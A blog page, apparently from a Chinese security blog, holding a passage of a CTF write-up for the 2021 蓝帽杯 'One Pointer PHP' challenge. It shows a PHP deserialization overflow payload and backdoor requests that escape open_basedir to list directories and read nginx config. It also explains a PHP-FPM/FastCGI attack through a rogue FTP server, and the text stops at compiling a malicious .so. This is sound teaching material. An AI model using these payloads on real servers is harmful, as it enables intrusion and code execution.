@@ -1,0 +1,589 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="sp4z">
+  <meta name="keywords" content="">
+  
+  <title>蓝帽杯 2021 One Pointer PHP - sp4z&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="蓝帽杯 2021 One Pointer PHP">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-06-08 09:26" pubdate>
+        2021年6月8日 上午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      4.1k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      69
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">蓝帽杯 2021 One Pointer PHP</h1>
+            
+            <div class="markdown-body">
+              <h1 id="蓝帽杯-2021-One-Pointer-PHP"><a href="#蓝帽杯-2021-One-Pointer-PHP" class="headerlink" title="[蓝帽杯 2021]One Pointer PHP"></a>[蓝帽杯 2021]One Pointer PHP</h1><p>下载web.zip，总共就两个文件</p>
+<p><a href="https://imgtu.com/i/2BWQgJ"><img src="https://z3.ax1x.com/2021/06/08/2BWQgJ.png" srcset="/img/loading.gif" lazyload alt="2BWQgJ.png"></a></p>
+<p>cookie中的data字段被反序列化</p>
+<p>add_api.php</p>
+<p><a href="https://imgtu.com/i/2BW8D1"><img src="https://z3.ax1x.com/2021/06/08/2BW8D1.png" srcset="/img/loading.gif" lazyload alt="2BW8D1.png"></a></p>
+<p>user.php</p>
+<p><a href="https://imgtu.com/i/2BWlv9"><img src="https://z3.ax1x.com/2021/06/08/2BWlv9.png" srcset="/img/loading.gif" lazyload alt="2BWlv9.png"></a></p>
+<p>只要让count属性等于long类型的最大值9223372036854775806即可绕过</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>&#123;<br>	<span class="hljs-keyword">public</span> <span class="hljs-variable">$count</span>=<span class="hljs-number">9223372036854775806</span>;<br>&#125;<br><br><br><span class="hljs-keyword">echo</span> urlencode(<span class="hljs-string">&quot;O:4:\&quot;User\&quot;:1:&#123;s:5:\&quot;count\&quot;;i:9223372036854775806;&#125;&quot;</span>); <span class="hljs-comment">//O%3A4%3A%22User%22%3A1%3A%7Bs%3A5%3A%22count%22%3Bi%3A9223372036854775806%3B%7D</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>插入cookie</p>
+<p><a href="https://imgtu.com/i/2BW3uR"><img src="https://z3.ax1x.com/2021/06/08/2BW3uR.png" srcset="/img/loading.gif" lazyload alt="2BW3uR.png"></a></p>
+<p>disable_functions</p>
+<p>[<img src="https://z3.ax1x.com/2021/06/08/2BWM34.png" srcset="/img/loading.gif" lazyload alt="2BWM34.png"></p>
+<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">stream_socket_client,fsockopen,<span class="hljs-keyword">putenv</span>,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,iconv,<span class="hljs-keyword">system</span>,<span class="hljs-keyword">exec</span>,shell_exec,<span class="hljs-keyword">popen</span>,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,error_log,debug_backtrace,debug_print_backtrace,gc_collect_cycles,array_merge_recursive<br></code></pre></td></tr></table></figure>
+
+
+
+<p>open_basedir限制了目录为/var/www/html</p>
+<p><a href="https://imgtu.com/i/2BWGHx"><img src="https://z3.ax1x.com/2021/06/08/2BWGHx.png" srcset="/img/loading.gif" lazyload alt="2BWGHx.png"></a></p>
+<p>scandir没有被禁，可以读取当前目录</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://e<span class="hljs-number">6</span>a<span class="hljs-number">47881</span>-<span class="hljs-number">7</span>b<span class="hljs-number">12</span>-<span class="hljs-number">43</span>f<span class="hljs-number">7</span>-ba<span class="hljs-number">28</span>-f<span class="hljs-number">08</span>c<span class="hljs-number">89117725</span>.node<span class="hljs-number">3</span>.buuoj.cn/add_api.php?backdoor=var_dump(scandir(<span class="hljs-string">&quot;./&quot;</span>));<br></code></pre></td></tr></table></figure>
+
+<p><a href="https://imgtu.com/i/2BWYE6"><img src="https://z3.ax1x.com/2021/06/08/2BWYE6.png" srcset="/img/loading.gif" lazyload alt="2BWYE6.png"></a></p>
+<h2 id="绕过open-basedir"><a href="#绕过open-basedir" class="headerlink" title="绕过open_basedir"></a>绕过open_basedir</h2><h3 id="chdir-与ini-set-组合"><a href="#chdir-与ini-set-组合" class="headerlink" title="chdir()与ini_set()组合"></a>chdir()与ini_set()组合</h3><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">/add_api.php?backdoor=<span class="hljs-keyword">mkdir</span>(<span class="hljs-string">&#x27;a&#x27;</span>);<span class="hljs-keyword">chdir</span>(<span class="hljs-string">&#x27;a&#x27;</span>);ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-keyword">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-keyword">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-keyword">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-keyword">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>);print_r(scandir(<span class="hljs-string">&#x27;/&#x27;</span>));<br></code></pre></td></tr></table></figure>
+
+
+
+<p>利用chdir和ini_set绕过open_basedir，发现根目录有flag文件，但是试了几个读取文件函数都不行。</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">http:<span class="hljs-regexp">//e</span>6a47881-<span class="hljs-number">7</span>b12-<span class="hljs-number">43</span>f7-ba28-f08c89117725.node3.buuoj.cn/add_api.php?backdoor=<span class="hljs-keyword">mkdir</span>(<span class="hljs-string">&#x27;a&#x27;</span>);<span class="hljs-keyword">chdir</span>(<span class="hljs-string">&#x27;a&#x27;</span>);ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-keyword">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-keyword">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-keyword">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-keyword">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>);print_r(scandir(<span class="hljs-string">&#x27;/&#x27;</span>));<br></code></pre></td></tr></table></figure>
+
+<p><a href="https://imgtu.com/i/2BWd8e"><img src="https://z3.ax1x.com/2021/06/08/2BWd8e.png" srcset="/img/loading.gif" lazyload alt="2BWd8e.png"></a></p>
+<h3 id="利用glob-绕过open-basedir"><a href="#利用glob-绕过open-basedir" class="headerlink" title="利用glob://绕过open_basedir"></a>利用glob://绕过open_basedir</h3><p>读取指定目录文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>printf(<span class="hljs-string">&#x27;&lt;b&gt;open_basedir : %s &lt;/b&gt;&lt;br /&gt;&#x27;</span>, ini_get(<span class="hljs-string">&#x27;open_basedir&#x27;</span>));<br><span class="hljs-variable">$file_list</span> = <span class="hljs-keyword">array</span>();<br><span class="hljs-comment">// normal files</span><br><span class="hljs-variable">$it</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;glob:///*&quot;</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$it</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>) &#123;<br>    <span class="hljs-variable">$file_list</span>[] = <span class="hljs-variable">$f</span>-&gt;__toString();<br>&#125;<br><span class="hljs-comment">// special files (starting with a dot(.))</span><br><span class="hljs-variable">$it</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;glob:///.*&quot;</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$it</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>) &#123;<br>    <span class="hljs-variable">$file_list</span>[] = <span class="hljs-variable">$f</span>-&gt;__toString();<br>&#125;<br>sort(<span class="hljs-variable">$file_list</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$file_list</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">&#123;$f&#125;</span>&lt;br/&gt;&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="利用PHP-FPM绕过disable-function"><a href="#利用PHP-FPM绕过disable-function" class="headerlink" title="利用PHP-FPM绕过disable_function"></a>利用PHP-FPM绕过disable_function</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>cgi</p>
+<figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta">语言解释器（如php、python）与web <span class="hljs-keyword">server</span>的通信协议<br></code></pre></td></tr></table></figure>
+
+<p>Fastcgi</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">Fastcgi是cgi协议的改进版，主要提高效率<br></code></pre></td></tr></table></figure>
+
+<p>PHP-FPM</p>
+<figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta">管理FastCGI的进程，FPM就是Fastcgi的协议解析器，web <span class="hljs-keyword">server</span>用cgi协议封装好用户的请求发给FPM，FPM按照cgi的协议将TCP流解析成真正的数据。<br></code></pre></td></tr></table></figure>
+
+
+
+<p>FastCGI协议结构</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>  <span class="hljs-comment">/* Header */</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> version; <span class="hljs-comment">// 版本</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> type; <span class="hljs-comment">// 本次record的类型</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> requestIdB1; <span class="hljs-comment">// 本次record对应的请求id</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> requestIdB0;<br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> contentLengthB1; <span class="hljs-comment">// body体的大小</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> contentLengthB0;<br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> paddingLength; <span class="hljs-comment">// 额外块大小</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> reserved; <br><br>  <span class="hljs-comment">/* Body */</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> contentData[contentLength];<br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> paddingData[paddingLength];<br>&#125; FCGI_Record;<br></code></pre></td></tr></table></figure>
+
+
+
+<p>Nginx把客户端数据通过FastCGI协议传给9000端口，PHP-FPM接收数据后调用CGI进程解析</p>
+<p><a href="https://imgtu.com/i/2BWaCD"><img src="https://z3.ax1x.com/2021/06/08/2BWaCD.png" srcset="/img/loading.gif" lazyload alt="2BWaCD.png"></a></p>
+<p>用户访问<code>http://127.0.0.1/index.php?a=1&amp;b=2</code>，如果web目录是<code>/var/www/html</code>，那么Nginx会将这个请求变成如下key-value对：</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs 1c">&#123;<br>    &#x27;GATEWAY_INTERFACE&#x27;: &#x27;FastCGI/1.0&#x27;,<br>    &#x27;REQUEST_METHOD&#x27;: &#x27;GET&#x27;,<br>    &#x27;SCRIPT_FILENAME&#x27;: &#x27;/var/www/html/index.php&#x27;,<br>    &#x27;SCRIPT_NAME&#x27;: &#x27;/index.php&#x27;,<br>    &#x27;QUERY_STRING&#x27;: &#x27;?a=1&amp;b=2&#x27;,<br>    &#x27;REQUEST_URI&#x27;: &#x27;/index.php?a=1&amp;b=2&#x27;,<br>    &#x27;DOCUMENT_ROOT&#x27;: &#x27;/var/www/html&#x27;,<br>    &#x27;SERVER_SOFTWARE&#x27;: &#x27;php/fcgiclient&#x27;,<br>    &#x27;REMOTE_ADDR&#x27;: &#x27;127.0.0.1&#x27;,<br>    &#x27;REMOTE_PORT&#x27;: &#x27;<span class="hljs-number">1234</span>5&#x27;,<br>    &#x27;SERVER_ADDR&#x27;: &#x27;127.0.0.1&#x27;,<br>    &#x27;SERVER_PORT&#x27;: &#x27;80&#x27;,<br>    &#x27;SERVER_NAME&#x27;: <span class="hljs-string">&quot;localhost&quot;</span>,<br>    &#x27;SERVER_PROTOCOL&#x27;: &#x27;HTTP/1.1&#x27;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><p>FPM默认监听9000端口，可以绕过webserver，直接构造fastcgi协议，和fpm通信。</p>
+<p>FastCGI协议中只可以传输</p>
+<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-number">1</span>.配置信息<br><span class="hljs-number">2</span>.需要被执行文件名(一般限制为php)<br><span class="hljs-number">3</span>.客户端的<span class="hljs-meta">GET</span>、POST、Cookie数据<br></code></pre></td></tr></table></figure>
+
+
+
+<p>所以主要通过修改配置信息来执行代码，利用php.ini的两个配置项</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-number">1.</span><span class="hljs-built_in">auto</span>_prependfile:执行目标文件前先包含<span class="hljs-built_in">auto</span>_prependfile指定的文件，可以使用php:<span class="hljs-comment">//input(需要修改配置文件才能开启)</span><br><span class="hljs-number">2.</span><span class="hljs-built_in">auto</span>_appendfile:在执行目标文件后，包含<span class="hljs-built_in">auto</span>_appendfile指定的文件<br></code></pre></td></tr></table></figure>
+
+<p>开启php://input方法</p>
+<figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">通过FastCGI协议的PHP_ADMIN_VALUE修改allow_url_include选项为<span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>传入环境变量</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs 1c">&#123;<br>    &#x27;GATEWAY_INTERFACE&#x27;: &#x27;FastCGI/1.0&#x27;,<br>    &#x27;REQUEST_METHOD&#x27;: &#x27;GET&#x27;,<br>    &#x27;SCRIPT_FILENAME&#x27;: &#x27;/var/www/html/index.php&#x27;,<br>    &#x27;SCRIPT_NAME&#x27;: &#x27;/index.php&#x27;,<br>    &#x27;QUERY_STRING&#x27;: &#x27;?a=1&amp;b=2&#x27;,<br>    &#x27;REQUEST_URI&#x27;: &#x27;/index.php?a=1&amp;b=2&#x27;,<br>    &#x27;DOCUMENT_ROOT&#x27;: &#x27;/var/www/html&#x27;,<br>    &#x27;SERVER_SOFTWARE&#x27;: &#x27;php/fcgiclient&#x27;,<br>    &#x27;REMOTE_ADDR&#x27;: &#x27;127.0.0.1&#x27;,<br>    &#x27;REMOTE_PORT&#x27;: &#x27;<span class="hljs-number">1234</span>5&#x27;,<br>    &#x27;SERVER_ADDR&#x27;: &#x27;127.0.0.1&#x27;,<br>    &#x27;SERVER_PORT&#x27;: &#x27;80&#x27;,<br>    &#x27;SERVER_NAME&#x27;: <span class="hljs-string">&quot;localhost&quot;</span>,<br>    &#x27;SERVER_PROTOCOL&#x27;: &#x27;HTTP/1.1&#x27;<br>    &#x27;PHP_VALUE&#x27;: &#x27;auto_prepend_file = php://input&#x27;,<br>    &#x27;PHP_ADMIN_VALUE&#x27;: &#x27;allow_url_include = On&#x27;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p>include前会判断文件是否存在，必须有一个php文件的绝对路径</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/i</span>ndex.php<br></code></pre></td></tr></table></figure>
+
+
+
+<p>利用方式：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">通过FastCGI协议的PHP_ADMIN_VALUE修改allow_url_include = On，开启php:<span class="hljs-regexp">//i</span>nput修改php.ini中的auto_prependfile配置项为php:<span class="hljs-regexp">//i</span>nput在执行目标文件前包含php:<span class="hljs-regexp">//i</span>nput，实现代码执行<br></code></pre></td></tr></table></figure>
+
+
+
+<p>要求</p>
+<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-number">1</span>.知道服务器上一个php文件的绝对路径，比如/var/www/html/index.php、/usr/local/<span class="hljs-class"><span class="hljs-keyword">lib</span>/<span class="hljs-title">php</span>/<span class="hljs-title">PEAR</span>.<span class="hljs-title">php</span></span><br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h3><p>phpinfo中显示项目为FastCGI</p>
+<p><a href="https://imgtu.com/i/2BWtUK"><img src="https://z3.ax1x.com/2021/06/08/2BWtUK.png" srcset="/img/loading.gif" lazyload alt="2BWtUK.png"></a></p>
+<p>读取配置文件<code>/etc/nginx/sites-enabled/default</code>，得到FPM的端口被改成了9001</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">http:<span class="hljs-regexp">//e</span>6a47881-<span class="hljs-number">7</span>b12-<span class="hljs-number">43</span>f7-ba28-f08c89117725.node3.buuoj.cn/add_api.php?backdoor=<span class="hljs-keyword">mkdir</span>(<span class="hljs-string">&#x27;a&#x27;</span>);<span class="hljs-keyword">chdir</span>(<span class="hljs-string">&#x27;a&#x27;</span>);ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-keyword">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-keyword">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-keyword">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-keyword">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>);print_r(file_get_contents(<span class="hljs-string">&#x27;/etc/nginx/sites-enabled/default&#x27;</span>));<br></code></pre></td></tr></table></figure>
+
+<p><a href="https://imgtu.com/i/2BWN4O"><img src="https://z3.ax1x.com/2021/06/08/2BWN4O.png" srcset="/img/loading.gif" lazyload alt="2BWN4O.png"></a></p>
+<p>VPS上搭建恶意的FTP服务器，骗取目标主机将 Payload 重定向到自己的 9001 端口上，从而实现攻击 PHP-FPM </p>
+<p>FTP协议被动方式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">在该方式中，FTP 客户端和服务端在建立控制通道的时候用二者的TCP 21端口建立连接，建立连接后发送 PASV 命令。FTP 服务器收到 PASV 命令后，随机打开一个高端端口（端口号大于1024）并且通知客户端在这个端口上传送数据的请求，客户端连接到 FTP 服务器的此高端端口，通过三次握手建立通道，然后FTP服务器将通过这个端口进行数据的传送。<br><br>可见，在被动方式中，FTP 客户端和服务端的数据传输端口是由服务端指定的，而且还有一点是很多地方没有提到的，实际上除了端口，服务器的地址也是可以被指定的。由于 FTP 和 HTTP 类似，协议内容全是纯文本，所以我们可以很清晰的看到它是如何指定地址和端口的：<br></code></pre></td></tr></table></figure>
+
+
+
+<p>利用原理总结</p>
+<figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-number">1.</span>file_put_contents() 函数在使用 <span class="hljs-type">FTP</span> 协议时，会将第二个参数 <span class="hljs-class"><span class="hljs-keyword">data</span> 中的内容上传到 <span class="hljs-type">FTP</span> 服务器。</span><br><span class="hljs-number">2.</span>被动模式下，服务器的地址和端口是可控的，可以将地址和端口指到 <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">9001</span>。<br><span class="hljs-number">3.</span>由于 <span class="hljs-type">FTP</span> 的特性，其会把 <span class="hljs-class"><span class="hljs-keyword">data</span> 原封不动的发给 127.0.0.1:9001，不会有任何的多余内容（类似 <span class="hljs-type">Gopher</span> 协议），完美符合攻击 <span class="hljs-type">Fastcgi</span>/<span class="hljs-type">PHP</span>-<span class="hljs-type">FPM</span> 的要求。</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>通过加载恶意so文件的方式利用，编译恶意so文件</p>
